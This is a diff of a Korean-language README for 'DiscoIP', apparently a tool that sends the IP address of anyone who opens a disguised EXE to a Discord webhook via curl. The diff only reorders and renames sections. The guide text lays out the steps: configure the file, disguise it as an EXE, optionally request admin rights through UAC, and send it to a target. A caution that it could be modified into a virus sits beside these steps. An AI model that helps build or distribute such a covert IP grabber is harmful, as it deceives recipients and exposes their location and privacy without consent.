@@ -11,18 +11,7 @@ DiscoIP는 상대가 EXE 파일을 열면 상대의 아이피가 디스코드 �
 </details>
 <br/>
 <details markdown="1">
-<summary>주의사항</summary>
-
-- **세팅만 해주시고 그 외의 코드를 삽입해주지 말아주세요(중요)**<br/>
-사용자가 바이러스로 개조할 가능성이 있습니다.
-제발 하지 말아주세요!<br/>
-- **DiscoIP는 Curl 라이브러리를 사용하기 떄문에 사용자의 컴퓨터에 Curl 이 다운되어 있지 않으면 웹훅크를 보낼 수 없습니다**<br/>
-대부분 컴퓨터는 Curl 이 기본적으로 다운되어 있지만 일부 컴퓨터는 다운되어 있지 않을 수 있습니다<br/>
-[CURL ](https://curl.se/)
-</details>
-<br/>
-<details markdown="1">
-<summary>DiscoIP 가이드</summary>
+<summary>DiscoIP 설명서</summary>
 <br/><br/>
 기본파일 설정 -> 기본파일을 EXE 파일로 위장 -> EXE 파일 배포
 <br/><br/>
@@ -73,6 +62,17 @@ UAC : 배포파일을 열떄 관리자 권한 요구<br/>
 배포파일을 상대방에게 보내보세요!
 
 </details>
+<details markdown="1">
+<summary>주의사항</summary>
+
+- **세팅만 해주시고 그 외의 코드를 삽입해주지 말아주세요(중요)**<br/>
+사용자가 바이러스로 개조할 가능성이 있습니다.
+제발 하지 말아주세요!<br/>
+- **DiscoIP는 Curl 라이브러리를 사용하기 떄문에 사용자의 컴퓨터에 Curl 이 다운되어 있지 않으면 웹훅크를 보낼 수 없습니다**<br/>
+대부분 컴퓨터는 Curl 이 기본적으로 다운되어 있지만 일부 컴퓨터는 다운되어 있지 않을 수 있습니다<br/>
+[CURL ](https://curl.se/)
+</details>
+<br/>
 <br/>
 <details markdown="1">
 <summary>오류해결</summary>
